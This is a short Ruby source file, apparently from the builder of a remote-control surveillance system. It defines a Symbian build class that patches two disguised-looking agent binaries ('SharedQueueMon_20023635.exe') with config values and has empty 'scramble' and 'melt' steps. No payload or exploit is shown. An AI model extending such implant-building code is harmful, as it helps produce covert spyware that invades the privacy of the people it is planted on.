#
#  Agent creation for symbian
#

# from RCS::Common
require 'rcs-common/trace'

module RCS
module DB

class BuildSymbian < Build

  def initialize
    super
    @platform = 'symbian'
  end

  def patch(params)

    trace :debug, "Build: patching: #{params}"

    # add the file to be patched to the params
    # these params will be passed to the super
    params[:core] = '5th/SharedQueueMon_20023635.exe'

    # invoke the generic patch method with the new params
    super

    params[:core] = '3rd/SharedQueueMon_20023635.exe'
    params[:config] = '2009093023'
    
    # invoke the generic patch method with the new params
    super

  end

  def scramble
    trace :debug, "#{self.class} #{__method__}"
  end

  def melt
    trace :debug, "#{self.class} #{__method__}"
  end

end

end #DB::
end #RCS::
